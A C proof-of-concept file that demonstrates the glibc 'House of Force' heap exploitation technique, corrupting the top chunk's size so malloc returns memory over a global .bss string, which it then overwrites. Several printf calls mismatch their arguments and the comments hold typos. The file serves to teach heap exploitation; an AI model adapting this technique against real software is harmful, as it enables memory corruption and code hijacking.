#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>​

char bss_var[] = "This is a string that we want to overwrite.";

int main()
{
    printf("This file demonstrates the house of force attack.\n");
    printf("The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
    printf("The top chunk is a special chunk. Is the last in memory and is the chunk that che be resized when malloc ask for more space to the os.\n");
    printf("Pointer to bss var %#lx.\n");
    printf("This is the memory that we are interested in writing in.", bss_var);
    printf("To actually perform this attack you need to know the address of the top chunk abìnd the possibility of doing a malloc with an arbitrary size.\n");
    void *ptr = malloc(100);
    printf("We allocate one chunk: %#lx\n", ptr);
    printf("Now the heap is composed by two chunks. The one allocated before and the top chunk.\n");
    int real_size = malloc_usable_size(ptr);
    printf("Real size of allocated chunk %d\n", real_size);
    void *ptr_top = ptr + real_size;
    printf("We compute a pointer to the top chunk %#lx\n", ptr_top);

    printf("Overwriting the size with a big value of the top chunk we can ensure that the malloc will never ask the os.\n");
    printf("Size of top chunk %#lx\n", *((long*)ptr_top));
    printf("We are overwriting with -1 because the size is unsigned\n");
    ((long*)ptr_top)[0] = -1;
    printf("Size of top chunk %#lx\n", *((long*)ptr_top));
    printf("Now we want to call malloc with a value x shuch that ptr_top + x = bss_var (malloc.c line 3800)\n");
    unsigned long x = ((unsigned long)bss_var - sizeof(long)*2) - (unsigned long)ptr_top;
    printf("x = %#lx\n", x);
    printf("N.B. x is so big that is doing an overflow. sizeof(long)*2) is subtracted to take into account of the metadata header.\n");
    void *new_ptr = malloc(x);
    printf("We allocate one more chunk to move topchunk in bss: %#x\n", new_ptr);
    void* ctr_chunk = malloc(100);
    printf("ctr chunk: %#lx\n", ctr_chunk);
    printf("bss_var: %#lx\n", bss_var);
    printf("Old var: %s\n", bss_var);
    strcpy(ctr_chunk, "YEAH!!!");
    printf("Overwrite done: %s\n", bss_var);
}